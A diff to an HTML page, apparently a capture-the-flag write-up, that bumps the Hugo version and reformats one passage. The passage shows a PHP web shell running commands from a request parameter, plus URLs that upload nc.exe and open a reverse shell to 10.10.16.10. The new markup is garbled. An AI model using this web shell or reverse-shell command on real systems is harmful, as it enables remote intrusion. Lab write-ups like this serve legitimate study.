@@ -39,7 +39,7 @@
 
     
 
-    <meta name="generator" content="Hugo 0.54.0" />
+    <meta name="generator" content="Hugo 0.57.2" />
   </head>
 
   <body class=" ">
@@ -131,12 +131,8 @@ if (isset($_REQUEST[&#39;fexec&#39;])) {
   echo &#34;&lt;<span style="color:#f92672">pre</span>&gt;&#34; . shell_exec($_REQUEST[&#39;fexec&#39;]) . &#34;&lt;/<span style="color:#f92672">pre</span>&gt;&#34;;
 };</code></pre></div>
 <p>Serve up nc.exe from your machine and download it</p>
-
-<p><code>http://10.10.10.9/catch.php?fupload=nc.exe</code></p>
-
-<p>Execute and catch shell</p>
-
-<p><code>http://10.10.10.9/catch.php?fexec=nc.exe 10.10.16.10 1234 -e cmd.exe</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http://10.10.10.9/catch.php?fupload=nc.exe```" data-lang="http://10.10.10.9/catch.php?fupload=nc.exe```">Execute and catch shell</code></pre></div>
+<p><a href="http://10.10.10.9/catch.php?fexec=nc.exe">http://10.10.10.9/catch.php?fexec=nc.exe</a> 10.10.16.10 1234 -e cmd.exe```</p>
 
   </article>
 </section>
